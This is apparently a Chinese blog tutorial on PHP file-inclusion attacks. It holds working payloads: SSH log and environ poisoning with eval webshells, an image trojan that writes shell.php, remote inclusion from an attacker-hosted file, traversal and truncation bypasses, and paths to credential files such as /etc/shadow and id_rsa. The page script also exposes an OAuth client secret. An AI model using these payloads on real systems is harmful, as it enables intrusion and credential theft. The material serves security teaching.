+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.imxn9l6ybw_1536892664" alt></p>
+<p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p>
+<h4 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h4><h5 id="利用条件：-5"><a href="#利用条件：-5" class="headerlink" title="利用条件："></a>利用条件：</h5><ol>
+<li>如果服务器开启了<code>ssh</code>,且我们使用的是默认ssh端口<code>22</code>,或者我们知道服务器使用什么端口</li>
+<li>需要知道<code>ssh-log</code>的位置，且可读。默认情况下为 <code>/var/log/auth.log</code></li>
+</ol>
+<h5 id="姿势：-5"><a href="#姿势：-5" class="headerlink" title="姿势："></a>姿势：</h5><p>用<code>ssh</code>或<code>putty</code>连接,<code>&lt;?php eval(POST_[&#39;test&#39;]) ?&gt;</code>作为<code>用户名</code>：</p>
+<pre><code>ssh &#39;&lt;?php eval(POST_[&#39;test&#39;]) ?&gt;&#39;@remotehost</code></pre><p>之后会提示输入密码等等，随便输入,这时肯定会登录失败,<strong>用户名</strong>(<code>&lt;?php eval(POST_[&#39;test&#39;]) ?&gt;</code>)会被记录在ssh的失败登入日志<code>ssh-log</code>上。即在<code>remotehost</code>的<code>ssh-log</code>中即可写入<strong>php代码</strong>：</p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.glirmkmnxh_1536892672" alt></p>
+<p>之后进行文件包含即可(菜刀连接)。<br>参考:<a href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/" target="_blank" rel="noopener">RCE with LFI and SSH Log Poisoning</a></p>
+<h3 id="包含environ环境变量"><a href="#包含environ环境变量" class="headerlink" title="包含environ环境变量"></a>包含environ环境变量</h3><h4 id="利用条件：-6"><a href="#利用条件：-6" class="headerlink" title="利用条件："></a>利用条件：</h4><ol>
+<li>php以<code>cgi</code>方式运行，这样environ才会保持UA头。</li>
+<li>environ文件存储位置已知，且environ文件可读。</li>
+</ol>
+<h4 id="姿势：-6"><a href="#姿势：-6" class="headerlink" title="姿势："></a>姿势：</h4><p><code>proc/self/environ</code>中会保存<code>user-agent</code>头。如果在<code>user-agent</code>中插入<code>php代码</code>，然后访问Web服务器,则<code>php代码</code>会被写入到<code>environ</code>中。之后再包含该文件获取webshell。下面是该文件的内容</p>
+<pre><code>DOCUMENT_ROOT=/home/sirgod/public_html 
+GATEWAY_INTERFACE=CGI/1.1 
+HTTP_ACCEPT=text/html, application/xml;q=0.9, application/xhtml+xml,
+image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
+HTTP_COOKIE=PHPSESSID=134cc7261b341231b9594844ac2ad7ac 
+HTTP_HOST=www.test.com 
+HTTP_REFERER=http://www.test.com/index.php 
+HTTP_USER_AGENT=Opera/9.80 (Windows NT 5.1; U; en) Presto/2.2.15 Version/10.00 
+PATH=/bin:/usr/bin 
+QUERY_STRING=view=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron 
+REDIRECT_STATUS=200 REMOTE_ADDR=6x.1xx.4x.1xx 
+REMOTE_PORT=35665 
+REQUEST_METHOD=GET 
+REQUEST_URI=/index.php?view=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron 
+SCRIPT_FILENAME=/home/sirgod/public_html/index.php 
+SCRIPT_NAME=/index.php 
+SERVER_ADDR=1xx.1xx.1xx.6x 
+SERVER_ADMIN=webmaster@test.com 
+SERVER_NAME=www.website.com 
+SERVER_PORT=80 
+SERVER_PROTOCOL=HTTP/1.0 
+SERVER_SIGNATURE=
+Apache/1.3.37 (Unix) mod_ssl/2.2.11 OpenSSL/0.9.8i DAV/2
+mod_auth_passthrough/2.1 mod_bwlimited/1.4 
+FrontPage/5.0.2.2635 Server at www.test.com Port 80</code></pre><p>可以参考这个：</p>
+<ol>
+<li><a href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html" target="_blank" rel="noopener">The proc/self/environ Injection</a></li>
+<li><a href="https://www.exploit-db.com/papers/12886/" target="_blank" rel="noopener">shell via LFI - proc/self/environ method</a></li>
+</ol>
+<h3 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h3><p>跟包含environ类似。</p>
+<p>参考：  <a href="https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method" target="_blank" rel="noopener">LFI Cheat Sheet：/proc/self/environ LFI Method</a></p>
+<h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.45boams7q0n_1536892681" alt></p>
+<p>php中上传文件，会创建临时文件。在linux下使用<code>/tmp</code>目录，而在windows下使用<code>c:\winsdows\temp</code>目录。在临时文件被删除之前，利用<strong>竞争</strong>即可包含该临时文件。</p>
+<p>由于包含需要知道包含的文件名。一种方法是进行<strong>暴力猜解</strong>，linux下使用的<strong>随机函数有缺陷</strong>，而window下只有<code>65535</code>中不同的文件名，所以这个方法是可行的。</p>
+<p>另一种方法是配合phpinfo页面的<code>php variables</code>，可以直接获取到<strong>上传文件的存储路径和临时文件名</strong>，直接包含即可。这个方法可以参考<a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="noopener">LFI With PHPInfo Assistance</a></p>
+<p>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题 <a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/" target="_blank" rel="noopener">XMAN夏令营-2017-babyweb-writeup | Chybeta</a></p>
+<h3 id="本地包含配合文件上传"><a href="#本地包含配合文件上传" class="headerlink" title="本地包含配合文件上传"></a>本地包含配合文件上传</h3><h4 id="说明-3"><a href="#说明-3" class="headerlink" title="说明"></a>说明</h4><p>很多网站通常会提供文件上传功能，比如：上传头像，文档等。</p>
+<h4 id="利用条件：-7"><a href="#利用条件：-7" class="headerlink" title="利用条件："></a>利用条件：</h4><p>千变万化，不过至少得知道上传的文件在哪，叫啥名字。。。</p>
+<p><strong>假设已经上传一句话图片木马到服务器</strong>，路径为：</p>
+<pre><code>/uploadfile/201363.jpg</code></pre><p>图片代码如下：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"&lt;?php eval($_POST[xxser]);?>"</span><span class="token punctuation">)</span><span class="token delimiter">?></span></code></pre>
+<h4 id="姿势：-7"><a href="#姿势：-7" class="headerlink" title="姿势："></a>姿势：</h4><p>访问URL：</p>
+<pre><code>http://www.xxser.com/Index.php?page=./uploadfile/201363.jpg</code></pre><p>包含这张图片，将会在<code>Index.php</code>所在的目录下生成<code>shell.php</code>，此时可以通过中国菜刀连接了。</p>
+<h3 id="读取敏感信息"><a href="#读取敏感信息" class="headerlink" title="读取敏感信息"></a>读取敏感信息</h3><p>访问URL：<code>http://www.xxser.com/index.php?page=/etc/passwd</code>,如果<strong>目标主机文件存在，并且有相应的权限</strong>，那么就可以读出文件内容。反之，会得到类似<code>open_basedirrestriction in effect.</code>的警告</p>
+<pre><code># 如下是例子，其中的../用于返回根目录，九个即可
+?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf</code></pre><p><a href="http://wiki.apache.org/httpd/DistrosDefaultLayout" target="_blank" rel="noopener">更多敏感信息路径</a></p>
+<h4 id="常见敏感信息路径如下"><a href="#常见敏感信息路径如下" class="headerlink" title="常见敏感信息路径如下"></a>常见敏感信息路径如下</h4><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><pre><code>C:\boot.ini        // 查看系统版本
+C:\windows\system32\inetsrv\MetaBase.xml    // IIS配置文件
+C:\windows\repair\sam                                    // 存储Windows系统初次安装的密码
+C:\Program Files\mysql\my.ini                          // Mysql配置
+C:\Program Files\mysql\data\mysql\user.MYD // Mysql root
+C:\windows\php.ini                                           // php配置信息
+C:\windows\my.ini                                            // Mysql配置文件</code></pre><h5 id="Linux-Unix"><a href="#Linux-Unix" class="headerlink" title="Linux/Unix"></a>Linux/Unix</h5><h6 id="普通权限"><a href="#普通权限" class="headerlink" title="普通权限"></a>普通权限</h6><pre><code>/etc/passwd
+/usr/local/app/apache2/conf/httpd.conf                            // apache2默认配置文件
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf         // 虚拟网站设置
+/usr/local/app/php5/lib/php.ini                                          // PHP相关配置
+/etc/httpd/conf/httpd.conf                                               // apache配置文件
+/etc/my.cnf                                                                       // Mysql的配置文件
+/var/log/apache/error.log
+/proc/self/environ
+/var/log/
+/var/log/apache/access.log</code></pre><h6 id="root权限"><a href="#root权限" class="headerlink" title="root权限:"></a>root权限:</h6><pre><code>/root/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/id_rsa.keystore
+/root/.ssh/id_rsa.pub
+/root/.ssh/known_hosts
+/etc/shadow
+/root/.bash_history
+/root/.mysql_history
+/var/log/wtmp
+/var/run/utmp</code></pre><h3 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h3><h4 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h4><p>目标主机的<code>allow_url_fopen</code>是激活的，那么就可以尝试<strong>远程包含一句话木马</strong>，假设我的一句话木马放在我的网站<code>http://www.2cto.com/echo.txt</code>上，代码如下：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"&lt;?php eval($_POST[xxser]);?>"</span><span class="token punctuation">)</span><span class="token delimiter">?></span></code></pre>
+<p>这时候访问url：<code>http://www.xxser.com/index.php?page=http://www.2cto.com/echo.txt</code>,将会在<code>index.php</code>所在的目录生成<code>shell.php</code>,内容如下：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>xxser<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre>
+<p>这时候再用菜刀去连接即可</p>
+<h3 id="其余"><a href="#其余" class="headerlink" title="其余"></a>其余</h3><p>一个web服务往往会用到多个其他服务，比如ftp服务，数据库等等。这些应用也会产生相应的文件，但这就需要具体情况具体分析咯。这里就不展开了</p>
+<h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><p>接下来聊聊绕过姿势。平常碰到的情况肯定不会是简简单单的<code>include $_GET[&#39;file&#39;];</code>这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码<strong>指定了前缀和后缀</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token string">'/var/www/html/'</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'/test/test.php'</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>这样就很“难”直接去包含前面提到的种种文件。</p>
+<h3 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h3><p>先考虑一下指定了前缀的情况吧。测试代码:</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token string">'/var/www/html/'</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><pre><code>?file=../../../../../../../../../var/lib/locate.db ?file=../../../../../../../../../var/lib/mlocate/mlocate.db
+# linux中这两个文件储存着所有文件的路径，需要root权限</code></pre><p>现在在<code>/var/log/test.txt</code>文件中有php代码<code>&lt;?php phpinfo();?&gt;</code>，则利用<code>../</code>可以进行<strong>目录遍历</strong>，比如我们尝试访问：</p>
+<pre><code>include.php?file=../../log/test.txt</code></pre><p>则服务器端实际拼接出来的路径为：<code>/var/www/html/../../log/test.txt</code>，也即<code>/var/log/test.txt</code>。从而包含成功</p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.inhqxe39yf_1536892695" alt></p>
+<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些<strong>编码</strong>来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p>
+<ul>
+<li>利用url编码<ul>
+<li><code>../</code><ul>
+<li><code>%2e%2e%2f</code></li>
+<li><code>..%2f</code></li>
+<li><code>%2e%2e/</code></li>
+</ul>
+</li>
+<li><code>..\</code><ul>
+<li><code>%2e%2e%5c</code></li>
+<li><code>..%5c</code></li>
+<li><code>%2e%2e\</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>二次编码<ul>
+<li><code>../</code><ul>
+<li><code>%252e%252e%252f</code></li>
+</ul>
+</li>
+<li><code>..\</code><ul>
+<li><code>%252e%252e%255c</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>容器/服务器的编码方式<ul>
+<li><code>../</code><ul>
+<li><code>..%c0%af</code><ul>
+<li>注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" target="_blank" rel="noopener">Why does Directory traversal attack %C0%AF work</a></li>
+</ul>
+</li>
+<li><code>%c0%ae%c0%ae/</code><ul>
+<li>注：java中会把”<code>%c0%ae</code>”解析为”<code>\uC0AE</code>”，最后转义为ASCCII字符的”<code>.</code>”（点）</li>
+<li>Apache Tomcat Directory Traversal</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>..\</code><ul>
+<li><code>..%c1%9c</code><h3 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h3>接着考虑<strong>指定后缀</strong>的情况。测试代码:</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'/test/test.php'</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>url格式</p>
+<pre><code>protocol :// hostname[:port] / path / [;parameters][?query]#fragment</code></pre><p>在远程文件包含漏洞（RFI）中，可以利用<code>query</code>或<code>fragment</code>来绕过后缀限制。</p>
+<h5 id="姿势一：query（？）"><a href="#姿势一：query（？）" class="headerlink" title="姿势一：query（？）"></a>姿势一：<code>query（？）</code></h5><pre><code>index.php?file=http://remoteaddr/remoteinfo.txt?</code></pre><p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt?/test/test.php</code><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作<code>query</code>从而被绕过</p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.pzruqe9hc9_1536892706" alt></p>
+<h5 id="姿势二：fragment（-）"><a href="#姿势二：fragment（-）" class="headerlink" title="姿势二：fragment（#）"></a>姿势二：<code>fragment（#）</code></h5><pre><code>index.php?file=http://remoteaddr/remoteinfo.txt%23</code></pre><p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt#/test/test.php</code><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作<code>fragment</code>从而被绕过。注意需要把<code>#</code>进行url编码为<code>%23</code>。</p>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.w2pf1u0sgd_1536892713" alt></p>
+<h4 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h4><p>利用条件： php版本 &lt; php 5.2.8</p>
+<p><strong>目录字符串</strong>，在linux下<code>4096</code>字节时会达到最大值，在window下是<code>256</code>字节。只要不断的重复<code>./</code>或者<code>../</code></p>
+<pre><code>index.php?file=././././。。。省略。。。././shell.txt</code></pre><p>则后缀<code>/test/test.php</code>，在<strong>达到最大值后会被直接丢弃掉</strong></p>
+<h4 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h4><p>利用条件：magic_quotes_gpc=off, php版本 &lt; php 5.3.4</p>
+<pre><code>index.php?file=phpinfo.txt%00
+# 或者需要回到根目录，利用../
+?file=../../../../../../../../../etc/passwd%00
+# 或者是
+?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code></pre><blockquote>
+<p>tips:<code>[...]</code>的意思是很多个点</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.gzc7mn8xsm_1536892722" alt></p>
+<p>能利用00截断的场景现在应该很少了</p>
+<h5 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h5><p>若是<strong>过滤了远程文件包含和我们目录的跳转</strong></p>
+<ol>
+<li><code>大小写混合输入</code>就可以绕过远程文件包含的过滤</li>
+<li>目录跳转的过滤我们可以构造<code>….//….//xxx.php</code>，方式绕过</li>
+</ol>
+<h4 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h4><pre><code>?file=../../../../../../../../../boot.ini/………[…]…………</code></pre><p>php版本小于5.2.8(?)可以成功，只适用windows，<strong>点号需要长于256*</strong></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="http://programmer.zhujunwu.cn/article/34231" target="_blank" rel="noopener">http://programmer.zhujunwu.cn/article/34231</a></li>
+</ul>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://www.fengwenhua.top" rel="external nofollow noreferrer">冯文华</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://www.fengwenhua.top/2019/03/11/wen-jian-bao-han-zong-jie/">https://www.fengwenhua.top/2019/03/11/wen-jian-bao-han-zong-jie/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://www.fengwenhua.top" target="_blank">冯文华</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/文件包含/">
+                                    <span class="chip bg-color">文件包含</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechatpay.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+        </div>
+    </div>
+
+    
+
+    
+        <link rel="stylesheet" href="/libs/gitment/gitment-default.css">
+<link rel="stylesheet" href="/css/gitment.css">
+
+<div class="gitment-card card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitment-content" class="card-content"></div>
+</div>
+
+<script src="/libs/gitment/gitment.js"></script>
+<script>
+var gitment = new Gitment({
+    id: 'Sun Mar 10 2019 21:32:39 GMT+0000',
+    owner: 'fengwenhua',
+    repo: 'fengwenhua.github.io',
+    oauth: {
+        client_id: '487b675438c149b5818b',
+        client_secret: '501477eec1e2ed9f27751d02281b5834021d6c7b'
+    }
+});
+
+gitment.render('gitment-content');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2019/03/11/web-yuan-ma-xie-lu-zong-jie/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="web源码泄露总结">
+                        
+                        <span class="card-title">web源码泄露总结</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            参考https://www.xmanblog.net/2017/04/03/web-code-leakage/
+寻找源代码备份
+在打ctf的时候,有时候页面什么提示都没有,这时候就要考虑一下是不是源代码泄露了
+
+hg 源码泄露hg init
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-03-10
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/渗透测试/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web源码泄露/">
+                        <span class="chip bg-color">web源码泄露</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/03/11/wen-jian-shang-chuan-jie-xi-zong-jie/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="文件上传解析总结">
+                        
+                        <span class="card-title">文件上传解析总结</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前言
+本文参考如下链接: https://github.com/CHYbeta/Web-Security-Learning
+
+概述Web站点一般会有用户注册的功能，当用户注册之后，大多数情况下都会存在类似头像上传等个性化的设置，这些功能点往
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-03-10
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/渗透测试/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            <a href="/categories/渗透测试/文件上传/" class="post-category">
+                                    文件上传
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/文件上传/">
+                        <span class="chip bg-color">文件上传</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+    
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
